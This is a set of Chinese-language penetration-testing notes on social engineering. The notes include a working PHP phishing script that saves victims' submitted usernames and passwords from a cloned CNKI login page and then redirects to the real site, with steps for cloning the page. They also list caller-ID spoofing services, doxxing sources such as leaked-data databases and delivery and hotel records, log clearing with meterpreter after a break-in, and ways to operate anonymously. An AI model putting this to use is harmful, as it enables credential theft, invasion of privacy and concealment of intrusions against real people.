# 渗透测试基础13

# 社会工程学认识（社工基础认识、网络钓鱼、电话钓鱼、伪装模拟-防止人家使用社工手段追踪自己、个人信息搜集、事件查看器-日志、vultr的安全操作、限制下载速度的匿名网盘——传输文件）

## 网络钓鱼：

使用网站克隆工具
实在不行，用手写



PHPstudy



新建php文件：

```
<?php

$username = $_POST['TextBoxUserName'];
$password = $_POST['TextBoxPwd'];

$txt = $username.'----'.$password;

$file = fopen('./haha.txt','w');  # 保存到文件
fwrite($file,$txt);  # 写入内容
fclose($file);   # 关闭文件

header("location:https://login.cnki.net/login/?platform=kns&ForceReLogin=1&ReturnURL=https://www.cnki.net/");
## 跳转页面

?>
```



右键另存为，保存正版网页到：

PHPstudy的www文件里

改文件夹名及格式：

![image-20220110205021816](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110205021816.png)

![image-20220110205040133](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110205040133.png)

全部替换：

![image-20220110205058878](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110205058878.png)



F12，对比正版和本地网站的显示，然后下载缺失部分到www的文件夹里。

寻找登录提交的相关代码，进行修改，并设置跳转页面。



## 电话钓鱼：

https://www.spoofbox.com/zh
网络电话、假来电显示

skype软件



## 伪装模拟：

防止人家使用社工手段追踪自己。



安全指数最高的邮箱
mail.protonmail.com



10分钟邮箱



短信接码平台



注册国外的产品:
购买/注册google voice(gv)帐号(送你一个美国本土的电话)



自己制作网站：
vps(网页 vpn)
【cloudflare只能帮你防御80和443端口的攻击和追踪】



## 个人信息搜集：

策略

盗号 qq 微信 博客 微博 社区 贴吧 开房记录 外卖 快递 手机app
统称：社工库
人轨

qq-->手机号-->支付宝

群关系，学校，同学关系

3D面部建模（证件照，身份证，护照......）

简历，公司关系查询



## 渗透到对方的服务器之后：

cmd--mmc--事件查看器

![image-20220110212825671](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110212825671.png)

![image-20220110212904449](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220110212904449.png)

（删除日志这件事本身就是一个日志，而且日志理论上无法单条删除）



关于清除日志：

meterpreter---clearev



## vultr的安全操作

vultr---使用kali的live模式--关闭ssh--直接使用网页连接(中国ip--美国vpn--vultr公司ip--内部网络操作kali-live)



## 限制下载速度的匿名网盘——传输文件：

https://anonfiles.com/





